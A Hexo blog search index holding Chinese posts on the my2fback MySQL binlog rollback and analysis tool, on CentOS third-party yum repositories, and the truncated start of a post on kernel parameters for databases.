<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[MySQL/MariaDB binlog/relaylog 回滚/闪回,前滚,DML分析报告,DDL信息]]></title>
    <url>%2F2019%2F07%2F17%2Fmy2fback%2F</url>
    <content type="text"><![CDATA[喜歡就去追阿～ 晚下手，你就是孩子她舅！早下手，就是喜当爹．．． 前言flashback闪回原理上一篇 flashback的概念最早出现于Oracle数据库，用于快速恢复用户的误操作。 flashback for MySQL用于恢复由DML语句引起的误操作，目前不支持DDL语句。例如下面的语句：1mysql> DELETE FROM XXX; UPDATE XXX SET YYY=ZZZ; 若没有flashback功能，那么当发生误操作时，用户只能通过全备+二进制日志前滚的方式进行恢复。通常来说，这样所需的恢复时间会非常长。为了缩短误操作恢复的时间，通常可以在slave上搭建LVM，通过定期快照的方式来缩短误操作的恢复时间。但是LVM快照的缺点是会对slave的性能产生一定的影响。 官方mysqlbinlog命令为解析MySQL的二进制日志。当二进制日志的格式为ROW格式时，可以输出每个操作的每条记录的前项与后项。那么通过逆操作即可进行回滚操作，例如：12345678原始操作：INSERT INTO ...flashback操作：DELETE ... 原始操作：DELETE FROM ...flashback操作：INSERT INTO ... 原始操作：UPDATE XXX SET OLD_VALUES ...flashback操作：UPDATE XXX SET NEW_VALUES ... 目前flashback功能还没有集成于官方mysqlbinlogg命令。于是自己开发了一套 MySQL Flashback 工具 my2fback 介绍my2fback 实现了基于row格式binlog的回滚闪回功能，让误删除或者误更新数据，可以不停机不使用备份而快速回滚误操作。也可以解释binlog（支持非row格式binlog）生成易读的SQL。可以按配置输出各个表的update/insert/delete统计报表， 也会输出大事务与长事务的分析， 应用是否干了坏事一目了然， 也会输出所有DDL。 my2fback 连接数据库帐号的权限: MySQL5.6/MariaDB10.1/MariaDB10.2版本 1mysql> GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT, PROCESS ON *.* TO 'user'@'localhost' IDENTIFIED BY 'xxxxxx'; MySQL5.7版本 12mysql> CREATE USER 'user'@'localhost' IDENTIFIED BY 'xxxxxx';mysql> GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT, PROCESS ON *.* TO 'user'@'localhost'; my2fback 通过解释mysql/mariadb binlog/relaylog实现以下三大功能: flashback/闪回/回滚， DML回滚到任意时间或者位置。 生成的文件名为rollback.xxx.sql或者db.tb.rollback.xxx.sql 生成的SQL形式如下1234beginDELETE FROM `test`.`t1` WHERE `id`=1# datetime=2019-06-15_16:23:58 database=test table=t1 binlog=mysql-bin.000012 startpos=417 stoppos=575commit 前滚，把binlog/relaylog的DML解释成易读的SQL语句。 支持非row格式的binlog， 默认不解释非row格式的DML， 需要指定参数 -stsql 生成的文件名为forward.xxx.sql或者db.tb.forward.xxx.sql 生成的SQL形式如下1234begin# datetime=2019-06-15_16:23:58 database=test table=t1 binlog=mysql-bin.000012 startpos=417 stoppos=575INSERT INTO `test`.`t1` (`id`,`name`,`sr`,`icon`,`points`,`sa`,`sex`) VALUES (1,'张三1','华南理工大学&SCUT',X'89504e47',1.1,1.1,1)commit 输出row格式下的原始SQL（5.7） 结果文件名为original_sql.binlogxxx.sql 统计分析， 输出各个表的DML统计， 输出大事务与长事务， 输出所有的DDL DML统计结果文件：binlog_status.txt 大事务与长事务结果文件：binlog_biglong_trx.txt DDL结果文件：ddl_info.txt 特点 支持V4版本的binlog， 支持传统与GTID的binlog， 支持mysql5.1与mairiadb5.5及以上版本的binlog， 也同样支持relaylog(结果中注释的信息binlog=xxx startpos=xxx stoppos=xx是对应的主库的binlog信息) –mtype=mariadb 支持以时间及位置条件过滤， 并且支持单个以及多个连续binlog的解释。 区间范围为左闭右开， [-sxx， -exxx) 解释binlog的开始位置： -sbin mysql-bin.000101 -spos 4 解释binlog的结束位置： -ebin mysql-bin.000105 -epos 4 解释binlog的开始时间 -sdt “2019-06-15 00:00:00” 解释binlog的结束时间 -edt “2019-06-15 11:00:00” 支持以库及表条件过滤, 以逗号分隔 支持正则表达式，如-dbs “db\d+,db_sh\d+”。正则表达式中请使用小写字母，因为数据库名与表名会先转成小写再与正则表达式进行匹配 -dbs db1,db2 -tbs tb1,tb2 支持以DML类型(update,delete,insert)条件过滤 -sql delete,update 支持分析本地binlog，也支持复制协议， my2fback作为一个从库从主库拉binlog来本地解释 -m file //解释本地binlog -m repl //my2fback作为slave连接到主库拉binlog来解释 输出的结果支持一个binlog一个文件， 也可以一个表一个文件 -f 例如对于binlog mysql-bin.000101, 如果一个表一个文件， 则生成的文件形式为 db.tb.rollback.101.sql(回滚) db.tb.forward.101.sql(前滚)， 否则是rollback.101.sql(回滚),forward.101.sql(前滚) 输出的结果是大家常见的易读形式的SQL，支持表名前是否加数据库名 -d123456begin# datetime=2019-06-15_00:14:34 database=test table=t1 binlog=mysql-bin.000012 startpos=21615 stoppos=22822UPDATE `test`.`t1` SET `sa`=1001 WHERE `id`=5;# datetime=2019-06-15_00:14:45 database=test table=t1 binlog=mysql-bin.000012 startpos=22822 stoppos=23930UPDATE `test`.`t1` SET `name`=null WHERE `id`=5;commit 否则为 123456begin# datetime=2019-06-15_00:14:34 database=test table=t1 binlog=mysql-bin.000012 startpos=21615 stoppos=22822UPDATE `t1` SET `sa`=1001 WHERE `id`=5;# datetime=2019-06-15_00:14:45 database=test table=t1 binlog=mysql-bin.000012 startpos=22822 stoppos=23930UPDATE `t1` SET `name`=null WHERE `id`=5;commit 输出结果支持是否保留事务 -k123456begin# datetime=2019-06-15_00:14:34 database=test table=t1 binlog=mysql-bin.000012 startpos=21615 stoppos=22822UPDATE `test`.`t1` SET `sa`=1001 WHERE `id`=5;# datetime=2019-06-15_00:14:45 database=test table=t1 binlog=mysql-bin.000012 startpos=22822 stoppos=23930UPDATE `test`.`t1` SET `name`=null WHERE `id`=5;commit 不保留则是这样：1234# datetime=2019-06-15_00:14:34 database=test table=t1 binlog=mysql-bin.000012 startpos=21615 stoppos=22822UPDATE `test`.`t1` SET `sa`=1001 WHERE `id`=5;# datetime=2019-06-15_00:14:45 database=test table=t1 binlog=mysql-bin.000012 startpos=22822 stoppos=23930UPDATE `test`.`t1` SET `name`=null WHERE `id`=5; 如果复制因为特别大的事务而中断， 则可以以不保留事务的形式生成前滚的SQL, 在从库上执行， 然后跳过这个事务， 再启动复制， 免去重建从库的麻烦， 特别是很大的库 支持输出是否包含时间与binlog位置信息 -e 包含额外的信息则为1234# datetime=2019-06-15_00:14:34 database=test table=t1 binlog=mysql-bin.000012 startpos=21615 stoppos=22822UPDATE `test`.`t1` SET `sa`=1001 WHERE `id`=5;# datetime=2019-06-15_00:14:45 database=test table=t1 binlog=mysql-bin.000012 startpos=22822 stoppos=23930UPDATE `test`.`t1` SET `name`=null WHERE `id`=5; 否则为12UPDATE `test`.`t1` SET `sa`=1001 WHERE `id`=5;UPDATE `test`.`t1` SET `name`=null WHERE `id`=5; 支持生成的SQL只包含最少必须的字段, 前提下是表含有主键或者唯一索引 默认为 12UPDATE `test`.`t1` SET `sa`=1001 WHERE `id`=5;DELETE FROM `test` WHERE `id`=5; -a 则为 12UPDATE `test`.`t1` SET `id`=5, `age`=21, `sex`='M',`sa`=1001, `name`='test' WHERE `id`=5 and `age`=21 and `sex`='M' and `sa`=900 and `name`='test';DELETE FROM `test` WHERE `id`=5 and `age`=21 and `sex`='M' and `sa`=900 and `name`='test'; 支持优先使用唯一索引而不是主键来构建where条件 -U 有时不希望使用主健来构建wheret条件， 如发生双写时， 自增主健冲突了， 这时使用非主健的唯一索引来避免生成的SQL主健冲突 支持生成的insert语句不包含主健 -I 发生双写时， 自增主健冲突了， 这时使用这个参数来让生成的insert语句不包括主健来避免生成的SQL主健冲突 支持大insert拆分成小insert语句。 -r 100 对于一个insert 1000行的插入， 会生成10个insert语句，每个语句插入100行 支持非row格式binlog的解释 当-w 2sql时加上参数-stsql，则会解释非row格式的DML语句。 由于不是支持所有要SQL， 如create trigger就不支持， 遇到SQL无法解释时会报错退出， 如需要跳过该SQL并继续解释， 请使用参数-ies。-ies 后接正则表达式， 解释错误或者无法解释的SQL如果匹配-ies指定的正则表达式， 则my2fback不会退出而是跳过该SQL继续解释后面的binlog， 否则错误退出。 -ies 后接的正则表达式请使用小写字母, my2fback会先把SQL转成小写再与之匹配。 安装与下载安装如果需要编译， 请使用GO>=1.11.x版本来编译。 开启GO111MODULE参数 编译linux 平台 1CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o releases/my2fback -ldflags "-s -w" main.go 编译windows 平台 1CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o releases/my2fback -ldflags "-s -w" main.go 没有开启GO111MODULE参数 编译linux 平台 1CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o releases/my2fback -ldflags "-s -w" main.go 编译windows 平台 1CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o releases/my2fback -ldflags "-s -w" main.go 下载 linux版本: linux_releases windows版本:windows_releases 使用帮助12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091test_dbs2 ~ # /usr/local/bin/my2fback -hmy2fback V2.0 By WangJiemin. E_mail: 278667010@qq.com****************************************************************************************************** system_command: /usr/local/bin/my2fback ** system_goos: linux ** system_arch: amd64 ** hostname: test_dbs2.yz.babytree-ops.org ** hostaddress: 10.10.1.221 ** blog: https://jiemin.wang ** read binlog from master, work as a fake slave: ./my2fback -m repl opts... ** read binlog from local filesystem: ./my2fback -m file opts... mysql-bin.000010 ****************************************************************************************************** -C works with -w='stats', keep analyzing transations to last binlog for -m=file, and keep analyzing for -m=repl -H string master host, DONOT need to specify when -w=stats. if mode is file, it can be slave or other mysql contains same schema and table structure, not only master. default 127.0.0.1 (default "127.0.0.1") -I for insert statement when -wtype=2sql, ignore primary key -M string valid options are: mysql,mariadb. server of binlog, mysql or mariadb, default mysql (default "mysql") -P uint master port, default 3306. DONOT need to specify when -w=stats (default 3306) -S string mysql socket file -U prefer to use unique key instead of primary key to build where condition for delete/update sql -a Works with -w=2sql|rollback. for update sql, include unchanged columns. for update and delete, use all columns to build where condition. default false, this is, use changed columns to build set part, use primary/unique key to build where condition -b int transaction with affected rows greater or equal to this value is considerated as big transaction. Valid values range from 10 to 30000, default 500 (default 500) -d Works with -w=2sql|rollback. Prefix table name with database name in sql, ex: insert into db1.tb1 (x1, x1) values (y1, y1). Default true (default true) -dbs string only parse database which match any of these regular expressions. The regular expression should be in lower case because database name is translated into lower case and then matched against it. Multi regular expressions is seperated by comma, default parse all databases. Useless when -w=stats -dj string dump table structure to this file. default tabSchame.json (default "tabSchame.json") -e Works with -w=2sql|rollback. Print database/table/datetime/binlogposition...info on the line before sql, default false -ebin string binlog file to stop reading -edt string Stop reading the binlog at first event having a datetime equal or posterior to the argument, it should be like this: "2004-12-25 11:25:56" -epos uint Stop reading the binlog at position -f Works with -w=2sql|rollback. one file for one table if true, else one file for all tables. default false. Attention, always one file for one binlog -i int works with -w='stats', print stats info each PrintInterval. Valid values range from 1 to 600, default 30 (default 30) -ies string for sql which is error to parsed and matched by this regular expression, just print error info, skip it and continue parsing, otherwise stop parsing and exit. The regular expression should be in lower case, because sql is translated into lower case and then matched against it. (default "^create definer.+trigger") -k Works with -w=2sql|rollback. wrap result statements with 'begin...commit|rollback' -l int transaction with duration greater or equal to this value is considerated as long transaction. Valid values range from 1 to 3600, default 300 (default 300) -m string valid options are: repl,file. repl: as a slave to get binlogs from master. file: get binlogs from local filesystem. default file (default "file") -mid uint works with -m=repl, this program replicates from master as slave to read binlogs. Must set this server id unique from other slaves, default 1113306 (default 1113306) -o string result output dir, default current work dir. Attension, result files could be large, set it to a dir with large free space -oj Only use table structure from -rj, do not get or merge table struct from mysql -ors for mysql>=5.6.2 and binlog_rows_query_log_events=on, if set, output original sql. default false -p string mysql user password. DONOT need to specify when -w=stats -r int Works with -w=2sql|rollback. rows for each insert sql. Valid values range from 1 to 500, default 30 (default 30) -rj string Works with -w=2sql|rollback, read table structure from this file and merge from mysql -sbin string binlog file to start reading -sdt string Start reading the binlog at first event having a datetime equal or posterior to the argument, it should be like this: "2004-12-25 11:25:56" -spos uint start reading the binlog at position -sql string valid options are: insert,update,delete. only parse these types of sql, comma seperated, valid types are: insert, update, delete; default is all(insert,update,delete) -stsql when -w=2sql, also parse plain sql and write into result file even if binlog_format is not row. default false -t uint Works with -w=2sql|rollback. threads to run, default 4 (default 2) -tbs string only parse table which match any of these regular expressions.The regular expression should be in lower case because database name is translated into lower case and then matched against it. Multi regular expressions is seperated by comma, default parse all tables. Useless when -w=stats -tl string time location to parse timestamp/datetime column in binlog, such as Asia/Shanghai. default Local (default "Local") -u string mysql user. DONOT need to specify when -w=stats -v print version -w string valid options are: tbldef,stats,2sql,rollback. tbldef: only get table definition structure; 2sql: convert binlog to sqls, rollback: generate rollback sqls, stats: analyze transactions. default: stats (default "stats")test_dbs2 ~ # 常用参数12345678910111213141516171819202122232425262728293031323334-m stringvalid options are: repl,file. repl: as a slave to get binlogs from master. file: get binlogs from local filesystem. default file (default "file") relp: 模仿 SLAVE 的IO_THREAD连接到MASTER获取BINLOG EVENT file: 解析本地的BINLOG(default: file)-w stringvalid options are: tbldef,stats,2sql,rollback. tbldef: only get table definition structure; 2sql: convert binlog to sqls, rollback: generate rollback sqls, stats: analyze transactions. default: stats (default "stats") 2sql: 解析成SQL语句 rollback: 解析为回滚语句-M stringvalid options are: mysql,mariadb. server of binlog, mysql or mariadb, default mysql (default "mysql") 选择是MySQL还是Mariadb, 不选择默认为MySQL-e Works with -w=2sql|rollback. Print database/table/datetime/binlogposition...info on the line before sql, default false 在sql之前的行上打印database/table/datetime/binlogposition...info，默认为false-f Works with -w=2sql|rollback. one file for one table if true, else one file for all tables. default false. Attention, always one file for one binlog 如果为true，则为一个表的一个文件，否则为所有表的一个文件。默认为false。注意，一个binlog总是一个文件-r intWorks with -w=2sql|rollback. rows for each insert sql. Valid values range from 1 to 500, default 30 (default 30) INSERT SQL 语句每一行包含的values的行数-t uintWorks with -w=2sql|rollback. threads to run, default 4 (default 2) 开启几个thread进行来执行解析2sql|rollback-o stringresult output dir, default current work dir. Attension, result files could be large, set it to a dir with large free space 输入的目录-k Works with -w=2sql|rollback. wrap result statements with 'begin...commit|rollback' 使用-w = 2sql | rollback。使用'begin ... commit | rollback'包装结果语句-l inttransaction with duration greater or equal to this value is considerated as long transaction. Valid values range from 1 to 3600, default 300 (default 300) -b inttransaction with affected rows greater or equal to this value is considerated as big transaction. Valid values range from 10 to 30000, default 500 (default 500) -dWorks with -w=2sql|rollback. Prefix table name with database name in sql, ex: insert into db1.tb1 (x1, x1) values (y1, y1). Default true (default true) 使用-w=2sql|rollback。在sql中具有数据库名称的前缀表名 例子 测试机器 CPU 2c 内存 4G 磁盘 400G file本地方式解析binlog 1test_dbs2 ~ # time /usr/local/bin/my2fback -m file -w 2sql -M mysql -t 6 -H ***.***.***.*** -u test -p test -dbs babytree -tbs userbaby -e -f -d -r 20 -k -b 100 -l 10 -o /data/bak/20190626/tosql /data/bak/20190626/mysql-bin.002938 1test_dbs2 ~ # ls /data/bak/20190626/tosql/ 1234567891011121314151617181920212223242526272829303132333435363738394041test_dbs2 ~ # cat /data/bak/20190626/tosql/babytree.UserBaby.forward.2938.sql |morecommit;begin;# datetime=2019-06-26_09:35:18 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=79686 stoppos=80034UPDATE `babytree`.`UserBaby` SET `name`='双双', `update_ts`=1561512918, `extra`='{\"born_preg_week\":30,\"born_preg_day\":5,\"is_premature\":0,\"born_height\":0,\"born_weight\":0,\"is_only_child\":0}' WHERE `id`=83758158;commit;begin;# datetime=2019-06-26_09:35:18 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=121354 stoppos=121552UPDATE `babytree`.`UserBaby` SET `birthday`=1582905600, `gender`=3, `update_ts`=1561512918, `extra`='{\"is_premature\":0}' WHERE `id`=87162805;commit;begin;# datetime=2019-06-26_09:35:18 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=128088 stoppos=128234INSERT INTO `babytree`.`UserBaby` (`id`,`user_id`,`name`,`birthday`,`gender`,`is_default`,`state`,`photo_url`,`text_info`,`create_ts`,`update_ts`,`baby_status`,`extra`) VALUES (87163008,87041217,'',0,1,1,1,'','',1561512918,1561512918,1,'');commit;begin;# datetime=2019-06-26_09:35:19 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=159954 stoppos=160134UPDATE `babytree`.`UserBaby` SET `gender`=0, `update_ts`=1561512919 WHERE `id`=87163008;commit;begin;# datetime=2019-06-26_09:35:19 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=251027 stoppos=251207UPDATE `babytree`.`UserBaby` SET `update_ts`=1561512919 WHERE `id`=87163007;commit;begin;# datetime=2019-06-26_09:35:20 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=342791 stoppos=342971UPDATE `babytree`.`UserBaby` SET `update_ts`=1561512920 WHERE `id`=87163008;commit;begin;# datetime=2019-06-26_09:35:22 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=607938 stoppos=608256UPDATE `babytree`.`UserBaby` SET `birthday`=1560268800, `gender`=1, `update_ts`=1561512922, `baby_status`=3, `extra`='{\"born_height\":0,\"born_weight\":0,\"is_premature\":0,\"born_preg_week\":39,\"born_preg_day\":0}' WHERE `id`=81204050;commit;begin;# datetime=2019-06-26_09:35:22 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=628699 stoppos=628897UPDATE `babytree`.`UserBaby` SET `birthday`=-192551296, `gender`=3, `update_ts`=1561512922, `extra`='{\"is_premature\":0}' WHERE `id`=87162871;commit;begin;# datetime=2019-06-26_09:35:22 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=631950 stoppos=632130UPDATE `babytree`.`UserBaby` SET `update_ts`=1561512922 WHERE `id`=84567514;commit; file本地方式回滚binlog1est_dbs2 ~ # time /usr/local/bin/my2fback -m file -w rollback -M mysql -t 6 -H ***.***.***.*** -u test -p test -dbs babytree -tbs userbaby -e -f -d -r 20 -k -b 100 -l 10 -o /data/bak/20190626/tosql /data/bak/20190626/mysql-bin.002938 -w 修改为 rollback 看上面解析的SQl,用grep 进行搜索下，是不是回滚对了。还有一定要和业务方确认，业务方确认，业务方确认。重要的事情说三遍12345678910111213141516171819202122232425262728test_dbs2 ~ # cat /data/bak/20190626/tosql/babytree.UserBaby.rollback.2938.sql|grep -C 2 83758158commit;begin;UPDATE `babytree`.`UserBaby` SET `name`='', `update_ts`=1548426675, `extra`='{\"born_preg_week\":30,\"born_preg_day\":5,\"is_premature\":0}' WHERE `id`=83758158;# datetime=2019-06-26_09:35:18 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=79686 stoppos=80034commit;test_dbs2 ~ # cat /data/bak/20190626/tosql/babytree.UserBaby.rollback.2938.sql|grep -C 2 87163008commit;begin;UPDATE `babytree`.`UserBaby` SET `birthday`=0, `gender`=0, `update_ts`=1561512920, `baby_status`=1, `extra`='' WHERE `id`=87163008;# datetime=2019-06-26_09:36:41 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=9292334 stoppos=9292532commit;--commit;begin;UPDATE `babytree`.`UserBaby` SET `update_ts`=1561512919 WHERE `id`=87163008;# datetime=2019-06-26_09:35:20 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=342791 stoppos=342971commit;--commit;begin;UPDATE `babytree`.`UserBaby` SET `gender`=1, `update_ts`=1561512918 WHERE `id`=87163008;# datetime=2019-06-26_09:35:19 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=159954 stoppos=160134commit;begin;DELETE FROM `babytree`.`UserBaby` WHERE `id`=87163008;# datetime=2019-06-26_09:35:18 database=babytree table=UserBaby binlog=mysql-bin.002938 startpos=128088 stoppos=128234commit; relp 方式解析binlog 数据库上的binlog文件起始文件和结束文件 1test_dbs2 ~ # time /usr/local/bin/my2fback -m repl -w 2sql -M mysql -t 6 -H ***.***.***.*** -u test -p test -dbs babytree -tbs userbaby -e -f -d -r 20 -k -b 100 -l 10 -sbin mysql-bin.003045 -spos 4 -ebin mysql-bin.003079 -epos 4 -o /data/bak/20190626/tosql/ 系统资源 执行截图 binlog文件共计有36个。文件大小为36G。解析时间:57m24.978s repl 方式回滚binlog1test_dbs2 ~ # time /usr/local/bin/my2fback -m repl -w rollback -M mysql -t 6 -H ***.***.***.*** -u test -p test -dbs babytree -tbs userbaby -e -f -d -r 20 -k -b 100 -l 10 -sbin mysql-bin.003045 -spos 4 -ebin mysql-bin.003045 -epos 888888 -o /data/bak/20190626/tosql/ 就不贴图了。和file方式一致。 解析文件可以是一个时间范围，也可以是一个positiions范围。 最后一个小菜鸟撸的菜鸟工具，如果有BUG。请大家多多包容。 测试通过，已经在宝宝树线上使用。累计恢复数据120G。 如果不放心。请使用binlog2sql。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 常用yum源整理]]></title>
    <url>%2F2019%2F06%2F05%2Flinux-yumReposSummary%2F</url>
    <content type="text"><![CDATA[出卖自己的灵魂和原则并不丢人，丢人的是没能卖一个好价钱。 前言CentOS系统带有几个官方源，默认启用的仅有base, updates和extras三个。如果希望从源安装Nginx，高版本的gcc/PHP等软件，则要导入提供软件包的第三方源。本文整理常见的第三方yum源，并以CentOS 7为例介绍其安装方法。 第三方yum源EPELEPEL是Extra Packages for Enterprise Linux的缩写，其为EL6或EL7提供重建的Fedora组件，并且不会替换base中的包。EPEL算得上是最著名的第三方软件源，几乎各个云服务器厂商提供的CentOS 系统均会自带该源并默认启用。其收录了web中常用的Nginx软件包。 EPEL的官网是：http://fedoraproject.org/wiki/EPEL，可以通过`yum install -y epel-release`安装。 SCLSCL是Software Collections的缩写，由CentOS 特别兴趣小组所维护。其收录了许多程序的新版本，例如gcc, PHP, git, python等。安装的软件可与旧版共存，包名多以rh-为前缀。 SCL的官网是https://www.softwarecollections.org，CentOS 7的安装方法是：yum install centos-release-scl。安装完成后在/etc/yum.repos.d目录下会出现CentOS-SCLo-scl.repo和CentOS-SCLo-scl-rh.repo两个文件。安装后源默认启用。 ELRepoELRepo是The Community Enterprise Linux Repository的缩写，旨在提供驱动程序来增强系统的硬件支持（包括：显示、文件系统、硬件监控、网络、音效、网络摄像镜驱动程序）。也提供较新版的内核，例如支持BBR算法的4.9+内核。 ELRepo的官方是http://elrepo.org/，CentOS 7系统的安装方法是：12rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.orgrpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm 安装完成后在/etc/yum.repos.d目录下出现elrepo.repo文件，可编辑文件中的enable的值启用具体仓库，也可在运行时用--enablerepo="xxx"指定使用的软件库。 IUSIUS的官网是https://ius.io/，旨在为RHEL和CentOS提供高质量、最新版的软件，如PHP, Python, MySQL等。CentOS 7安装该源的命令为：rpm -Uvh https://centos7.iuscommunity.org/ius-release.rpm。 RPMfusionRPMfusion提供Fedora Project或 Red Hat不愿发行的软件，包含“免费（开源软件）”和“非免费（源代码可公开获取但不开源且限非商业用途）”两种类型的仓库。 RPMfusion的官网是https://rpmfusion.org/，CentOS 7的安装方法是：1234# 免费库yum localinstall --nogpgcheck https://download1.rpmfusion.org/free/el/rpmfusion-free-release-7.noarch.rpm# 非免费库yum localinstall --nogpgcheck https://download1.rpmfusion.org/nonfree/el/rpmfusion-nonfree-release-7.noarch.rpm RemiRemi维护大量组件，包括最新版的PHP, GLPI等。Remi的safe仓库不会替代系统的基本组件，但remi-phpxx.repo中的软件包会替代系统默认的php。需要注意的是Remi可能会与IUS的软件包冲突，因为双方都提供最新版的PHP。 Remi的官方网站是http://rpms.remirepo.net/，CentOS 7的安装方法是：yum install -y remi-release。 Webtatic提供较新版的PHP、MySQL及其它组件。建议用IUS或SCL代替。 软件官方维护的源除上述收录多个软件包的综合源外，还有许多由软件官方维护的源，例如Nginx, Gitlab, Nodejs等。这些源的安装和使用方法请参考官方指南。 源管理源的配置文件均位于/etc/yum.repos.d目录下，可用vim, nano等编辑器打开配置文件并编辑。 一些有用的源管理yum命令： yum repolist： 列出所有启用的源, 等同于yum repolist enabled； yum repolist disabled： 列出所有禁用的源； yum repoinfo [enabled|disabled]：列出启用（禁用）源的更详细信息 yum --disablerepo="*" --enablerepo="xxxx" install/search: 从指定源安装/搜索软件；"–disablerepo"和"–enablerepo"选项可独立或配合使用，动态启用和禁用源。 国内镜像因为某些原因，从位于境外的源镜像安装软件慢的让人抓狂。如果遇到了此种情形，建议使用代理，或者配置源的地址为国内镜像的地址。国内知名的yum源镜像站有： 阿里云，网址：https://opsx.alibaba.com/mirror 网易163，网址：http://mirrors.163.com/ 清华大学，网址：http://mirrors.tuna.tsinghua.edu.cn/ 中科大，网址：http://mirrors.ustc.edu.cn/ 浙大，网址：http://mirrors.zju.edu.cn/ 具体仓库的配置方法请参考站内指南。需要注意的是并非所有的镜像都包含上述列出的yum源，本人推荐阿里云、清华大学、中科大镜像站。 参考 https://wiki.centos.org/zh/AdditionalResources/Repositories document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DBA不可不知的操作系统内核参数]]></title>
    <url>%2F2019%2F05%2F24%2FLinux-systemctl-variables%2F</url>
    <content type="text"><![CDATA[每当我找到成功的钥匙，就发现有人把锁芯给换了。 背景操作系统为了适应更多的硬件环境，许多初始的设置值，宽容度都很高。 如果不经调整，这些值可能无法适应HPC，或者硬件稍好些的环境。 无法发挥更好的硬件性能，甚至可能影响某些应用软件的使用，特别是数据库。 数据库关心的OS内核参数512GB 内存为例 1. 参数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000100110021003100410051006100710081009101010111012101310141015101610171018101910201021102210231024102510261027102810291030103110321033103410351036103710381039104010411042104310441045104610471048104910501051105210531054105510561057105810591060106110621063106410651066106710681069107010711072107310741075107610771078107910801081108210831084108510861087108810891090109110921093109410951096109710981099110011011102110311041105110611071108110911101111111211131114111511161117111811191120112111221123112411251126112711281129113011311132113311341135113611371138113911401141114211431144114511461147114811491150115111521153115411551156115711581159116011611162116311641165116611671168116911701171117211731174117511761177117811791180118111821183118411851186118711881189119011911192119311941195119611971198119912001201120212031204120512061207120812091210121112121213121412151216121712181219122012211222122312241225122612271228122912301231123212331234123512361237123812391240124112421243124412451246124712481249125012511252125312541255125612571258125912601261126212631264126512661267126812691270127112721273127412751276127712781279128012811282fs.aio-max-nr ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` aio-nr & aio-max-nr: . aio-nr is the running total of the number of events specified on the io_setup system call for all currently active aio contexts. . If aio-nr reaches aio-max-nr then io_setup will fail with EAGAIN. . Note that raising aio-max-nr does not result in the pre-allocation or re-sizing of any kernel data structures. . aio-nr & aio-max-nr: . aio-nr shows the current system-wide number of asynchronous io requests. . aio-max-nr allows you to change the maximum value aio-nr can grow to. ``` 推荐设置 ``` fs.aio-max-nr = 1xxxxxx . PostgreSQL, Greenplum 均未使用io_setup创建aio contexts. 无需设置。 